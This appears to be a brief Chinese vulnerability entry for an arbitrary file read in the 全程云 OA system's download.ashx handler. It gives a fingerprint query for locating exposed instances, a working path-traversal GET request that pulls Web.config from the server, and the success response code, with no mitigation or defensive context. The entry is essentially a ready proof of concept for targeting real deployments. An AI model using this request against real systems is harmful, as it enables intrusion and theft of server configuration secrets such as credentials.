# 全程云OAdownload.ashx存在任意文件读取漏洞

全程云 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`product="全程云-管理系统"`
- **请求**：`GET /OA/SMS/download.ashx?FilePath=../Web.config HTTP/1.1`
- **响应特征**：200